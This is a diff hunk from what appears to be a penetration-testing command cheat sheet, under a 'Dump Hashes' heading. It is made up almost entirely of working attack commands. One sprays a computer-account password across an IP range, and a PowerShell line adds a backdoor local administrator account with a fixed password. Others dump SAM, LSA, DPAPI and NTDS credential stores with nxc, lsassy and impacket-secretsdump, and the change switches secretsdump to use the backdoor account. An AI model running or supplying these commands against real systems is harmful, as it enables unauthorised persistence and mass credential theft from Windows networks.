@@ -1728,7 +1728,7 @@ nxc smb 192.168.110.51-56 -u computers -p PRE2k --no-bruteforce
 +---------- Dump Hashes ----------+
 powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
 nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
-impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' -M lsassy
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
 
